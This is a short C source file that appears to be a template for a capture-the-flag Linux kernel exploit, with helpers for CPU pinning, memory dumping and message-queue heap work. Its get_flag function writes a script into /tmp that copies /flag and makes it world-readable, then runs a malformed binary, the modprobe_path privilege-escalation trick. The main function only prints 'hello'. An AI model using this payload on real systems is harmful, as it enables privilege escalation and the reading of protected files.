#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <sys/ipc.h>
#include <sys/msg.h>

void hex_print(void *buf, size_t size) {
  for (int i = 0; i < size; i += 0x10) {
    printf("0x%016lx: ", (uintptr_t)(buf + i));
    printf("0x%016lx ", *(unsigned long *)(buf + i));
    printf("0x%016lx\n", *(unsigned long *)(buf + i + 8));
  }
}

int proc_open(char * name) {
  int fd = open(name, O_RDWR);
  if (fd < 0) {
    puts("invalid fd");
    exit(-1);
  }
  return fd;
}

static void pin_cpu(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset) != 0)
    perror("pin_cpu");
}

void get_flag(void){
  system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
  system("chmod +x /tmp/x");

  puts("[*] Run unknown file");
  system("/home/hacker/malformed");

  puts("[*] Hopefully flag is readable");
  system("cat /tmp/flag");

  exit(0);
}

int main() {
  puts("hello");
  return 0;
}
